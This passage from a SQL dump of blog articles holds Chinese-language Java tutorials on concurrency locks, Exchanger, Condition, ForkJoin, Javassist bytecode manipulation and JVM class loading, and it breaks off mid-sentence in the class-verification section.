锁当前是否被线程获取\n */\npublic class ReentranLockExample {\n\n    private static final ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) throws InterruptedException {\n        /*IntStream.range(0, 2).forEach(i -> new Thread(){\n            @Override\n            public void run() {\n                needLockBySync();\n            }\n        }.start());*/\n        /*Thread thread1 = new Thread(() -> testUnInterruptibly());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testUnInterruptibly());\n        thread2.start();\n        TimeUnit.SECONDS.sleep(1);\n        thread2.interrupt();\n        System.out.println(\"==============\"); */\n        /*Thread thread1 = new Thread(() -> testTryLock());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testTryLock());\n        thread2.start();*/\n        Thread thread1 = new Thread(() -> testUnInterruptibly());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testUnInterruptibly());\n        thread2.start();\n        TimeUnit.SECONDS.sleep(1);\n        Optional.of(lock.hasQueuedThreads()).ifPresent(System.out::println); // true waitingQueue等待队列中是否有线程\n        Optional.of(lock.getQueueLength()).ifPresent(System.out::println);// 1 waitingQueue等待队列中的线程数量\n        Optional.of(lock.hasQueuedThread(thread1)).ifPresent(System.out::println); // false thread是否在等待队列中\n        Optional.of(lock.hasQueuedThread(thread2)).ifPresent(System.out::println); // true\n        Optional.of(lock.isLocked()).ifPresent(System.out::println); // 是否已被lock\n    }\n\n    public static void testTryLock() {\n        if (lock.tryLock()) {\n            try {\n                Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n                while (true) {\n\n                }\n            } finally {\n                lock.unlock();\n            }\n        } else {\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" not get lock\").ifPresent(System.out::println);\n        }\n    }\n\n    public static void testUnInterruptibly() {\n        try {\n            lock.lockInterruptibly(); // 可以被打断\n            Optional.of(Thread.currentThread().getName() + \":\"+ lock.getHoldCount()).ifPresent(System.out::println); // 当前线程对该锁的保持次数\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n            while (true) {\n\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void needLock() {\n        try {\n            lock.lock();\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n            TimeUnit.SECONDS.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void needLockBySync() {\n        synchronized (ReentranLockExample.class) {\n            try {\n                Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n                TimeUnit.SECONDS.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n### ReentrantReadWriteLock\n```java\n// ReentrantReadWriteLock\n(1) 它在没有任何读写锁时,才可以获得写锁\n(2) 如果我们执行进行读取时,经常可能有另一个执行要写入的需求,为了保证同步,ReentrantReadWriteLock读取锁定就可以派上用场。\n(3) 读取很多,写入很少的情况下使用ReentrantReadWriteLock可能会使写入线程遭遇饥饿(写入线程常常无法竞争到锁定,一直处于等待状态) \n(4) 实现的是悲观读取,如果你想获得写入锁的时候,坚决不允许有任何的读锁还保持着,所以多读取低写入时常处于饥饿。\n\n```\n#### 读写锁使用\n```java\n/**\n * ReentrantReadWriteLock 读写锁\n*  {@link ReentrantReadWriteLock(boolean)}  是否是公平锁,默认false\n * {@link ReentrantReadWriteLock#readLock()} 获取读锁\n * {@link ReentrantReadWriteLock#writeLock()} 获取写锁\n * W W  X\n * W R  X\n * R W  X\n * R R  O\n */\npublic class ReadWriteLockExample {\n\n\n    private final static ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock(true);\n\n    private final static Lock readLock = readWriteLock.readLock();\n\n    private final static Lock writeLock = readWriteLock.writeLock();\n\n    private final static List<Long> data = new ArrayList<>();\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread thread1 = new Thread(ReadWriteLockExample::read);\n        thread1.start();\n\n        TimeUnit.SECONDS.sleep(1);\n\n        Thread thread2 = new Thread(ReadWriteLockExample::read);\n        thread2.start();\n    }\n\n    public static void write() {\n        try {\n            writeLock.lock();\n            data.add(System.currentTimeMillis());\n            TimeUnit.SECONDS.sleep(5);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            writeLock.unlock();\n        }\n    }\n\n    public static void read() {\n        try {\n            readLock.lock();\n            data.forEach(System.out::println);\n            TimeUnit.SECONDS.sleep(5);\n            System.out.println(Thread.currentThread().getName() + \"============\");\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            readLock.unlock();\n        }\n    }\n}\n```\n### StampedLock\n```java\n// StampedLock\n(1) 它的目的是用于解决写锁饥饿问题,比如99个读线程与1个写线程,很可能导致这1个写线程迟迟抢不到锁,导致数据迟迟不刷新\n(2) StampedLock有三种模式: 排他写,悲观读,乐观读\n(3) 所有获取锁的方法，都返回一个邮戳（Stamp），Stamp为0表示获取失败，其余都表示成功；\n(4) 所有释放锁的方法，都需要一个邮戳（Stamp），这个Stamp必须是和成功获取锁时得到的Stamp一致\n(5) 在ReentrantReadWriteLock中，当读锁被使用时，如果有线程尝试获取写锁，该写线程会阻塞。\n但在乐观读中，即使读线程获取到了读锁，写线程尝试获取写锁也不会阻塞，这相当于对读模式的优化。\n但是可能会导致数据不一致的问题。所以，当使用乐观读获取到读锁时，必须对获取结果进行校验。\n(6) 这一改动可以大幅度提高程序的吞吐量,StampedLock对吞吐量有巨大改进,特别是读线程越来越多的情况下。\n\n```\n#### StampedLock的使用\n```java\n/**\n * StampedLock邮戳锁\n * {@link StampedLock#tryOptimisticRead()}  tryOptimisticRead方法尝试一个乐观读，返回一个邮戳，作为这一次锁获取的凭证\n * {@link StampedLock#validate(long)} 判断stamp是否在读过程发生期间被修改\n */\npublic class StampedLockExample3 {\n    // Java8引入，StampedLock可以认为是读写锁的改进版本，采用乐观加锁机制\n    private final static StampedLock s1 = new StampedLock();\n    private static Point point = new Point();\n\n    public static void main(String[] args) {\n        // 写入线程\n        Runnable mRunnable = new Runnable() {\n            @Override\n            public void run() {\n                point.move(new Random().nextInt(100), new Random().nextInt(100));\n            }\n        };\n        // 读取线程\n        Runnable rRunnable = new Runnable() {\n            @Override\n            public void run() {\n                point.distanceFromOrigin();\n            }\n        };\n        // 写入\n        for (int i = 0; i < 10; i++) {\n            new Thread(mRunnable).start();\n        }\n        // 读取\n        for (int i = 0; i < 20; i++) {\n            new Thread(rRunnable).start();\n        }\n    }\n\n    // 来自JDK文档\n    public static class Point {\n        private double x, y;\n\n        public void move(double deltaX, double deltaY) {\n            // 获得排他锁 写锁\n            long stamp = s1.writeLock();\n            try {\n                x = deltaX;\n                y = deltaY;\n            } finally {\n                s1.unlockWrite(stamp);\n            }\n        }\n\n        public void distanceFromOrigin() {\n            // tryOptimisticRead方法尝试一个乐观读，返回一个邮戳，作为这一次锁获取的凭证\n            long stamp = s1.tryOptimisticRead();\n            // 将全部变量拷贝到方法体栈内\n            double currentX = x, currentY = y;\n            // 判断stamp是否在读过程发生期间被修改\n            // 如果没有被更改，则读取有效\n            // 如果stamp是不可用的，可以如CAS操作一样，循环使用乐观读\n            // 或者升级锁的级别，升级为悲观锁\n            if (!s1.validate(stamp)) { //重点\n                // 获取悲观的读锁，进一步读取数据，此时线程可能被挂起【挂起使用的是Unsafe.park()方法】\n                // park方法遇到线程中断会直接返回。可能存在park的线程再次进入循环，如果不能退出，将占用大量CPU资源\n                stamp = s1.readLock();\n                try {\n                    currentX = x;\n                    currentY = y;\n                } finally {\n                    s1.unlockRead(stamp);\n                }\n            }\n            System.out.println(currentX * currentX + currentY * currentY);\n        }\n    }\n}\n```', 0, 0, 55, 0, 0, '2020-07-04 15:34:04', '2020-07-04 15:34:04', 0, 0);
INSERT INTO `article` VALUES (97, 1, 'JUC-Exchanger、Condition、ForkJoin', '2019/10/1571044776_mmexport1570975119924.jpg', '### Exchanger\n```java\n// Exchanger\n(1) 可以在对中对元素进行配对和交换的线程的同步点。每个线程将条目上的某个方法呈现给 exchange 方法，与伙伴线程进行匹配，并且在返回时接收其伙伴的对象\n(2) Exchanger 可能在应用程序（比如遗传算法和管道设计）中很有用\n(3) 它允许在并发任务之间交换数据。具体来说，Exchanger类允许在两个线程之间定义同步点。当两个线程都到达同步点时，他们交换数据结构，因此第一个线程的数据结构进入到第二个线程中，第二个线程的数据结构进入到第一个线程中\n\n// 应用场景\n(1) 两个线程互为搭档进行传递通讯\n\n// 注意事项\n(1) 如果线对线程未到达更改点，则该线程将被阻塞,这会导致一个线程崩溃后,另一个线程会一直处于等待阻塞\n(2) 使用Exchanger必须配对\n(3) 操作同一对象时注意线程安全\n```\n#### 两个线程互为搭档进行传递通讯\n```java\n/**\n * 应用场景\n *  两个线程互为搭档进行传递通讯\n */\npublic class ExchangerExample1 {\n    /**\n     * V r = exchange(V v)\n     *      v: indicate the object the current thread wanted transfer 指示当前线程要传输的对象\n     *      r: indicate the other thread(pair) return object 另一个线程（对）返回对象\n     * <pre>\n     *     Note:\n     *      1. if the pair thread not reached change point,the thread will blocked 如果线对线程未到达更改点，则该线程将被阻塞\n     *      2. use the @{@link Exchanger} must be paired  使用{@link Exchanger}必须配对\n     *      3. manipulating the same object thread safe 操作同一对象时注意线程安全\n     * </pre>\n     * @param args\n     */\n    public static void main(String[] args) {\n        final Exchanger<String> exchanger = new Exchanger<String>();\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(Thread.currentThread().getName() + \" start.\");\n                try {\n                    String str = \"I am come T-A\";\n                    // 搭档线程的返回值\n                    // String result = exchanger.exchange(\"I am come T-A\", 1, TimeUnit.SECONDS); 超时等待\n                    String result = exchanger.exchange(str);\n                    System.out.println(Thread.currentThread().getName() + \" Get value [\" + result + \"]\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(Thread.currentThread().getName() + \" end.\");\n            }\n        }, \"==A==\").start();\n\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(Thread.currentThread().getName() + \" start.\");\n                try {\n                    String str = \"I am come T-B\";\n                    TimeUnit.SECONDS.sleep(5);\n                    String result = exchanger.exchange(str);\n                    System.out.println(Thread.currentThread().getName() + \" Get value [\" + result + \"]\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(Thread.currentThread().getName() + \" end.\");\n            }\n        }, \"==B==\").start();\n    }\n}\n```\n### Condition\n```java\n// Condition\n(1) Condition是一个多线程间起到协调通信的工具类,或者某个线程等待某个条件,只有当某条件满足这些等待的线程才会被唤醒\n(2) Condition是配合ReentrantLock来使用的\n(3) Condition相对于传统synchronized的线程通信更加便于使用\n(4) Condition维护了一个等待信号的队列并在适时的时候将节点放入AQS等待队列中实现唤醒操作\n(5) 整个协作过程依靠节点在AQS的等待队列和condition的等待队列中来回移动来实现的\n```\n#### 单生产消费模式\n```java\n/**\n * 单生产消费模式\n * {@link ReentrantLock#lock } 获取锁 阻塞\n * {@link ReentrantLock#unlock } 释放锁\n * {@link Condition#await }  进入等待 相当于monitor.wait()\n * {@link Condition#signal } 唤醒Condition中单个线程 相当于monitor.notify()\n * {@link Condition#signalAll } 唤醒Condition中全部线程 相当于monitor.notify()\n */\npublic class ConditionExample1 {\n\n    private final static ReentrantLock lock = new ReentrantLock();\n\n    private final static Condition condition = lock.newCondition();\n\n    private static int data = 0;\n\n    private static volatile boolean noUse = true;\n\n    public static void main(String[] args) {\n        new Thread(()->{\n            for(;;) {\n                buildData();\n            }\n        }).start();\n\n        new Thread(()->{\n            for(;;) {\n                useData();\n            }\n        }).start();\n    }\n\n    private static void buildData() {\n        try {\n            lock.lock(); // synchronized monitorEnter\n            while (noUse) {\n                condition.await(); // monitor.wait()\n            }\n            Optional.of(\"P:\" + data).ifPresent(System.out::println);\n            TimeUnit.SECONDS.sleep(1);\n            data++;\n            noUse = true;\n            condition.signal(); // monitor.notify()\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock(); // synchronized monitorEnter\n        }\n    }\n\n    private static void useData() {\n        try {\n            lock.lock();\n            while (!noUse) {\n                condition.await();\n            }\n            Optional.of(\"C:\" + data).ifPresent(System.out::println);\n            noUse = false;\n            condition.signal();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n}\n```\n#### 多生产消费模式\n```java\n/**\n * 多生产消费模式\n *  由于synchronized与monitor的关系,导致传统synchronized只能唤醒全部线程来完成\n *  而Condition使得不同的线程可以在不同的Condition中,更方便线程的唤醒与等待\n */\npublic class ConditionExample3 {\n\n    private final static ReentrantLock lock = new ReentrantLock();\n\n    private final static Condition PRODUCE_COND = lock.newCondition();\n\n    private final static Condition CONSUME_COND = lock.newCondition();\n\n    private final static LinkedList<Long> TIMESTAMP_POOL = new LinkedList<>();\n\n    private final static int MAX_CAPACITY = 100;\n\n    public static void main(String[] args) throws InterruptedException {\n        IntStream.range(0, 5).boxed().forEach(ConditionExample3::beginProduce);\n        IntStream.range(0, 5).boxed().forEach(ConditionExample3::beginConsume);\n        for(;;) {\n            TimeUnit.SECONDS.sleep(5);\n            System.out.println(\"===========\");\n            // 要在lock的线程调用这些方法,否则抛出异常\n            /*System.out.println(\"PRODUCE_COND.getWaitQueueLength>\" + lock.getWaitQueueLength(PRODUCE_COND));\n            System.out.println(\"CONSUME_COND.getWaitQueueLength>\" + lock.getWaitQueueLength(CONSUME_COND));\n            System.out.println(\"PRODUCE_COND.hasWaiters>\" + lock.hasWaiters(PRODUCE_COND));\n            System.out.println(\"CONSUME_COND.hasWaiters>\" + lock.hasWaiters(CONSUME_COND));*/\n        }\n    }\n\n    public static void beginProduce(int i) {\n        new Thread(()->{\n            for(;;) {\n                produce();\n                sleep(2);\n            }\n        }, \"P-\" + i).start();\n    }\n\n    public static void beginConsume(int i) {\n        new Thread(()->{\n            for(;;) {\n                consume();\n                sleep(3);\n            }\n        }, \"C-\" + i).start();\n    }\n\n    public static void produce() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.size() >= MAX_CAPACITY) {\n                PRODUCE_COND.await();\n            }\n            Long value = System.currentTimeMillis();\n            System.out.println(Thread.currentThread().getName() + \"-P-\" + value);\n            TIMESTAMP_POOL.addLast(value);\n            CONSUME_COND.signalAll();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void consume() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.isEmpty()) {\n                CONSUME_COND.await();\n            }\n            Long value = TIMESTAMP_POOL.removeFirst();\n            System.out.println(Thread.currentThread().getName() + \"-C-\" + value);\n            PRODUCE_COND.signalAll();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    private static void sleep(long sec) {\n        try {\n            TimeUnit.SECONDS.sleep(sec);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n### ForkJoin\n```java\n// ForkJoin\n(1) 它是一个把大任务分割成若干个小任务,最终汇总每个小任务结果后得到大任务结果的工具实现类\n(2) 它主要采用了工作窃取算法,工作切取算法指某个线程从其他队列里窃取任务来执行\n(3) 通过这种方式充分利用线程它们的运行时间来提高应用程序的性能\n\n// 应用场景\n(1) 将大任务拆分数个小任务最后进行合并结果集\n```\n#### 将大任务拆分数个小任务最后进行合并结果集,有返回值\n```java\n/**\n * 应用场景\n *  将大任务拆分数个小任务最后进行合并结果集\n *  RecursiveTask 有返回值\n */\npublic class ForkJoinRecursiveTask {\n\n    private final static int MAX_THRESHOLD = 300;\n\n    public static void main(String[] args) {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        ForkJoinTask<Integer> future = forkJoinPool.submit(new CalculatedRecursiveTask(0, 1000));\n        try {\n            Integer result = future.get();\n            System.out.println(result);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } catch (ExecutionException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class CalculatedRecursiveTask extends RecursiveTask<Integer> {\n\n        private final int start;\n\n        private final int end;\n\n        CalculatedRecursiveTask(int start, int end) {\n            this.start = start;\n            this.end = end;\n        }\n\n        @Override\n        protected Integer compute() {\n            if (end-start <= MAX_THRESHOLD) {\n                return IntStream.rangeClosed(start, end).sum();\n            } else {\n                int middle = (start + end) / 2;\n                CalculatedRecursiveTask leftTask = new CalculatedRecursiveTask(start, middle);\n                CalculatedRecursiveTask rightTask = new CalculatedRecursiveTask(middle + 1, end);\n                leftTask.fork();\n                rightTask.fork();\n                return leftTask.join() + rightTask.join();\n            }\n        }\n    }\n}\n```\n#### 将大任务拆分数个小任务最后进行合并结果集,没有返回值\n```java\n/**\n * 应用场景\n *  将大任务拆分数个小任务最后进行合并结果集\n *  RecursiveAction 没有返回值\n */\npublic class ForkJoinRecursiveAction {\n\n    private final static int MAX_THRESHOLD = 300;\n\n    private final static AtomicInteger SUM = new AtomicInteger(0);\n\n    public static void main(String[] args) throws InterruptedException {\n        final ForkJoinPool forkJoinPool = new ForkJoinPool();\n        forkJoinPool.submit(new CalculatedRecursiveAction(0, 1000));\n        forkJoinPool.awaitTermination(10, TimeUnit.SECONDS); // 等待任务完成\n        Optional.of(SUM).ifPresent(System.out::println);\n    }\n\n    private static class CalculatedRecursiveAction extends RecursiveAction {\n\n        private final int start;\n\n        private final int end;\n\n        CalculatedRecursiveAction(int start, int end) {\n            this.start = start;\n            this.end = end;\n        }\n\n        @Override\n        protected void compute() {\n            if (end-start <= MAX_THRESHOLD) {\n                SUM.addAndGet(IntStream.rangeClosed(start, end).sum());\n            } else {\n                int middle = (start + end) / 2;\n                CalculatedRecursiveAction leftTask = new CalculatedRecursiveAction(start, middle);\n                CalculatedRecursiveAction rightTask = new CalculatedRecursiveAction(middle + 1, end);\n                leftTask.fork();\n                rightTask.fork();\n            }\n        }\n    }\n}\n```', 0, 0, 60, 0, 0, '2020-07-04 17:19:44', '2020-07-04 17:19:44', 0, 0);
INSERT INTO `article` VALUES (98, 1, 'Class字节码文件与操纵字节码示例', '2018/8/1533962123_4263b004ee2929bd838d79feeb754b62.jpg', '### Class文件概述\n![类加载Class文件.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626668469_类加载-Class文件.png)\n```java\n// Class文件格式概述\nClass文件是JVM的输入,Java虚拟机规范中定义了Class文件的结构,Class文件是JVM实现平台无关,技术无关的基础\n(1) Class文件是一组以8字节为单位的字节流,各个数据项目按顺序紧凑排列\n(2) 对于占用空间大于8字节的数据项,按照高位在前的方式分割成多个8字节进行存储\n(3) Class文件格式里面只有两种类型:无符号数、表\n	- (1) 无符号数: 基本数据类型,以u1,u2,u4,u8来代表几个字节的无符号数\n	- (2) 表: 由多个无符号数和其他表构成的复合数据类型,通常以\"_info\"结尾\n\n// Class文件格式\n(1) javap工具生成非正式的\"虚拟机汇编语言\",格式如下\n	<index><opcode>[<operand1>[<operand2>..]][<comment>]\n(2) <index>是指令操作码在数组中的下标,该数组以字节形式来存储当前方法的Java虚拟机代码;也可以是相对于方法起始处的字节偏移量\n(3) <opcode>是指令的助记码,<operand>是操作数,<comment>是行尾的注释\n\n```\n### 字节码操纵框架\n```java\n// 什么是字节码技术\n(1) jvm底层执行的指令\n(2) 对当前文件进行字节码操作,如lombok生成Set,Get就是依靠字节码技术来实现\n(3) 可以完成如动态代理等设计思想的实现\n(4) 目前许多框架如cglib,hibernate,spring都直接或间接地使用ASM操作字节码\n\n// ASM概述\n(1) ASM是一个Java字节码操纵框架,它能被用来动态生成类或者增强既有类的功能\n(2) ASM可以直接产生二进制class文件,也可以在类被加载入虚拟机之前动态改变类行为,ASM从类文件中读入信息后,能够改变类行为,分析类信息,甚至能根据要求生成新类\n\n// ASM编程模型\nCoreAPI: 提供了基于事件形式的编程模型。该模型不需要一次性将整个类的结构读取到内存中,因此这种方式更快,需要更少的内存,但这种编程方式难度较大\nTreeAPI: 提供了基于树形的编程模型。该模型需要一次性将一个类的完整结构全部读取到内存当中,所以这种方法需要更多的内存,这种编程方式较简单\n```\n### 操作字节码-例子\n#### 创建字节码文件\n```java\n/**\n * 使用Java字节码技术创建字节码\n * @author tuwq\n */\npublic class Create {\n	/**\n	 * 创建类\n	 * 创建属性\n	 * 添加方法\n	 * 添加构造函数\n	 * 生成Class文件\n	 * @param args\n	 * @throws Exception \n	 */\n	public static void main(String[] args) throws Exception {\n		ClassPool pool = ClassPool.getDefault();\n		CtClass userClass = pool.makeClass(\"root.bytecode.User\");\n		CtField nameField = CtField.make(\"private String name;\", userClass);\n		CtField ageField = CtField.make(\"private Integer age;\", userClass);\n		userClass.addField(nameField);\n		userClass.addField(ageField);\n		\n		CtMethod getNameMethod = CtMethod.make(\"public String getName() {return name;}\", userClass);\n		userClass.addMethod(getNameMethod);\n		CtConstructor ctConstructor = new CtConstructor(new CtClass[] {pool.get(\"java.lang.String\"),pool.get(\"java.lang.Integer\")}, userClass);\n		ctConstructor.setBody(\"{ this.name = name;this.age = age; }\");\n		userClass.addConstructor(ctConstructor);\n		// F:/dirtest会出现User.class文件\n		userClass.writeFile(\"F:/dirtest\");\n	}\n} \n```\n#### 修改字节码文件\n```java\n/**\n * 动态修改字节码文件\n * @author tuwq\n */\npublic class Update {\n\n	/**\n	 * 获得字节码文件\n	 * 修改方法\n	 * 执行方法\n	 * @param args\n	 * @throws Exception\n	 */\n	public static void main(String[] args) throws Exception {\n		ClassPool pool = ClassPool.getDefault();\n		CtClass userClass = pool.get(\"root.bytecode.User\");\n		CtMethod method = new CtMethod(CtClass.voidType, \"sum\", new CtClass[] {CtClass.intType,CtClass.intType}, \n				userClass);\n		method.setBody(\"{System.out.println( $1 + $2 );}\");\n		userClass.addMethod(method);\n		userClass.writeFile(\"F:/dirtest\");\n		\n		Class clazz = userClass.toClass();\n		Object newInstance = clazz.newInstance();\n		Method sumMethod = clazz.getDeclaredMethod(\"sum\", int.class, int.class);\n		sumMethod.invoke(newInstance, 1, 1);\n	}\n	\n	private static void sum(int i, int j) {\n		System.out.println( i + j );\n	}\n}\n```', 0, 0, 116, 0, 0, '2020-11-04 12:24:50', '2020-11-04 12:24:50', 0, 0);
INSERT INTO `article` VALUES (99, 1, '类加载概述与类加载过程', '2019/10/1570533935_mmexport1570368053996.jpg', '### 类加载概念\n#### 类加载器\n![类加载类加载器与字节码执行引擎.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626433255_类加载-类加载器与字节码执行引擎.png)\n```java\n// Java代码是怎么运行起来的\n假设写好了一份Java代码，那这份Java代码中,会包含很多的“.java”为后缀的代码文件\n比如User.java，OrderService.java，CustomerManager.java\n写好的“.java”代码打包的过程中，一般就会把代码编译成“.class”后缀的字节码文件，比如“User.class”，“Hello.class”，”Customer.class“。\n这个“.class”后缀的字节码文件才是可以被运行起来的\n\n对于编译好的这些\".class\"字节码,就需要使用诸如“java -jar”之类的命令来运行。\n此时一旦采用“java”命令，实际上此时就会启动一个JVM进程。\n这个JVM就会来负责运行这些“.class”字节码文件，也就相当于是负责运行我们写好的代码。\n接着下一步，JVM要运行这些“.class”字节码文件中的代码,首先得把这些“.class”文件中包含的各种类给加载进来\n这些“.class”文件就是写好的一个一个的类\n此时会有一个\"类加载器\"的概念。\n此时会采用类加载器把编译好的那些“.class”字节码文件给加载到JVM中，然后供后续代码运行来使用。\n\n当类加载器把编译好的那些“.class”字节码文件给加载到JVM后\n接着，最后一步，JVM就会基于自己的\"字节码执行引擎\"，来执行加载到内存里的写好的那些类\n比如你的代码中有一个\"main()\"方法，那么JVM就会从这个\"main()\"方法开始执行里面的代码。\n当\"main()方法\"需要哪个类的时候，就会使用类加载器来加载对应的类，反正对应的类就在“.class”文件中。\n\n// 概述什么是类加载\n(1) 每个编写的\".java\"拓展名类文件都存储着需要执行的程序逻辑，这些\".java\"文件经过Java编译器编译成拓展名为\".class\"的文件\n(2) \".class\"文件中保存着Java代码经转换后的虚拟机指令，当需要使用某个类时，虚拟机将会加载它的\".class\"文件，并创建对应的class对象，将class文件加载到虚拟机的内存，这个过程称为类加载\n\n```\n#### 何时加载一个类\n```java\n// JVM在什么情况下会加载一个类\nJVM在执行我们写好的代码的过程中，一般在什么情况下会去加载一个类\n也就是说，什么时候会从\".class\"字节码文件中加载这个类到JVM内存里来。\n答案就是: 你的代码中用到这个类的时候\n\n// 例子\n比如有一个类（Hello.class），里面有一个\"main()\"方法作为主入口。\npublic class Hello {\n	public static void main() {}\n}\n\n一旦JVM进程启动后，它一定会先把这个类（Hello.cass）加载到内存里，然后从\"main()\"方法的入口代码开始执行。\n接着假设上面的代码中，出现了如下的这么一行代码：\npublic class Hello {\n	public static void main() {\n		User user = new User();\n	}\n}\n\n代码中明显需要使用\"User\"这个类去实例化一个对象，此时必须得把\"User.class\"字节码文件中的这个类加载到内存里。\n所以这个时候就会触发JVM通过类加载器，从\"User.class\"字节码文件中加载对应的类到内存里来使用，这样代码才能跑起来。\n\n简单概括一下何时会加载一个类：\n首先代码中包含\"main()\"方法的主类一定会在JVM进程启动之后被加载到内存,开始执行你的\"main()\"方法中的代码。\n接着遇到使用了别的类，比如\"User\"，此时就会从对应的“.class”字节码文件加载对应的类到内存里来。\n\n```\n### 类加载的各个阶段\n![类加载类加载的过程.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626438246_类加载-类加载的过程.png)\n```java\n// 类加载的主要过程\n一个类从加载到使用，一般会经历下面的这个过程：\n加载 -> 验证 -> 准备 -> 解析 -> 初始化 -> 使用 -> 卸载\n\n(1) 加载: 查找并加载类文件的二进制数据\n(2) 连接: 就是将已经读入内存的类的二进制数据合并到JVM运行时环境中去,包含如下几个步骤\n	(1) 验证: 确保被加载类的正确性\n	(2) 准备: 为类的静态变量分配内存,并初始化它们\n	(3) 解析: 把常量池中的符号引用转换成直接引用\n(3) 初始化: 为类的静态变量赋初始值\n```\n#### 加载阶段\n```java\n// 加载阶段作用\n(1) 类的加载简单来说,就是将class文件中的二进制数据读取到内存中,将其放在方法区中,然后在堆区中创建一个java.lang.Class对象,用来封装在方法区的数据结构\n(2) 更具体一些: 将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区中的运行时数据结构，在堆中生成一个代表这个类的java.lang.Class对象，作为方法区类数据的访问入口，这个过程需要类加载器参与\n(3) 当系统运行时，类加载器将.class文件的二进制数据从外部存储器（如光盘，硬盘）调入内存中，CPU再从内存中读取指令和数据进行运算，并将运算结果存入内存中。内存在该过程中充当着\"二传手\"的作用，通俗的讲，如果没有内存，类加载器从外部存储设备调入.class文件二进制数据直接给CPU处理，而由于CPU的处理速度远远大于调入数据的速度，容易造成数据的脱节，所以需要内存起缓冲作用。\n(4) 类将.class文件加载至运行时的方法区后，会在堆中创建一个Java.lang.Class对象，用来封装类位于方法区内的数据结构，该Class对象是在加载类的过程中创建的，每个类都对应有一个Class类型的对象，Class类的构造方法是私有的，只有JVM能够创建。因此Class对象是反射的入口，使用该对象就可以获得目标类所关联的.class文件中具体的数据结构。\n(5) 在加载阶段完成后,虚拟机外部的的二进制数据数据量就会按照虚拟机所需要的格式存储在方法区中(数据结构),然后在堆区中创建一个Class对象,这个对象作为程序访问方法区中这些数据结构的外部接口.\n(6) 类加载的最终产物就是位于堆中的Class对象，该对象封装了类在方法区中的数据结构，并且向用户提供了访问方法区数据结构的接口，即Java反射的接口\n\n// 类加载要完成的功能\n(1) 通过类的全限定名来获取该类的二进制字节流\n(2) 把二进制字节流转换为方法区的运行时数据结构\n(3) 在堆上创建一个java.lang.Class对象,用来封装类在方法区内的数据结构,并向外提供了访问方法区内数据结构的接口\n\n// 加载类的方式\n最常见的方式: 本地文件系统中加载,从jar等归档文件中加载\n动态的方式: 将Java源文件动态编程成class\n其他方式: 本地磁盘中直接加载,网络下载,从专有数据库中加载等等\n\n```\n#### 验证阶段\n```java\n// 验证阶段\n这一步就是根据Java虚拟机规范，来校验你加载进来的“.class”文件中的内容，是否符合指定的规范。\n这个很好理解，假如说你的\".class\"文件被人篡改了，里面的字节码压根儿不符合规范，那么JVM是没法去执行这个字节码的！\n所以把\".class\"加载到内存里后，必须先验证一下，校验他必须完全符合JVM规范，后续才能交给JVM来运行。\n\n// 验证阶段作用\n(1) 确保加载的类信息符合JVM规范，没有安全方面的问题\n(2) 加载阶段与链接阶段的部分内容可以是交叉进行的,比如一部分代码加载完成就可以进行验证,提高效率\n(3) 验证主要的目的是确保Class文件中的字节流中包含的信息符合虚拟机的要求,并且不会损害到JVM自身安全\n\n// 主要验证的内容\n(1) 类文件结构检查: 按照JVM规范规定的Class(类)文件结构进行检查\n(2) 元数据验证: 对字节码描述的信息进行语义分析,保证其符合Java语言规范要求\n(3) 字节码验证: 通过对数据流和控制流进行分析,确保程序语义是合法和符合逻辑的。这里主要对方法体进行校验\n(4) 符号引用验证: 对类自身以外的信息,也就是常量池中的各种符号引用,进行匹配校验\n\n// 具体验证种类\n(1) 文件格式验证:魔术因子是否正确,0XCAFEBABE,主从版本号是否符合当前虚拟机,常量池中的常量类型是不是不支持等等\n(2) 语义检查: 是否有父类,父类是不是允许继承,是否实现了抽象方法,是否覆盖了父类的final字段,等其他的语义检查\n(3) 字节码验证: 主要进行数据流和控制流的分析,不会出现这样的情况,在操作栈中放置了一个int类型,但是却给了一个long行的数据\n(4) 